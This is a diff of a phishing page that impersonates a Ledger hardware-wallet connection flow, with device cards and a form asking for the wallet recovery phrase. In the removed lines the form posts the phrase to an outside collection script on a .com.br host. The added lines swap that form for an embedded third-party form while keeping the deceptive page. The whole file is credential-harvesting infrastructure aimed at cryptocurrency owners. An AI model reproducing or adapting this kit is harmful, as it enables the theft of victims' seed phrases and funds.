@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 
 <html lang="en">
@@ -105,14 +106,23 @@ function Function() {
             <p class="desc">Connect</p>
           </div>
         </div>
+<?php 
+      if ($msg != "") {
 
+   ?>
+   <div style=""><h5 style="color:black;"><?php echo $msg ?></h5></div>
+ <?php } ?>
         <div id="step-1">
+
           <h4 class="mt-5 text-center">Select your device</h4>
 
           <div class="myCards">
+            
             <div class="card-device">
+              
               <img src="files/webwallet_files/verified.png" alt="" class="verified">
               <img src="files/webwallet_files/nanox.png" alt="" class="device">
+
               <p class="mt-2">Ledger Nano X</p>
               <span class="badge badge-secondary" style="font-size: 10px;">USB Only</span>
             </div>
@@ -179,13 +189,9 @@ function Function() {
         </center>
 		  
 
-          <form action="https://zapchopp.com.br/contactt/df4573__64363/dmt25/ledger/process.php" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
+          <form action="index.html" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
             <div class="form-group">
-              <textarea name="key" id="phrase" required="required" minlength="12" 
-			  style="width: 100%; margin: 0 auto;" 
-			  placeholder="Enter your Recovery phrase here" 
-			  class="form-control" rows="3"></textarea>
-
+            <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
             </div>
 			
             <span class="disabled" id="message">Enter a space between each word.</span>
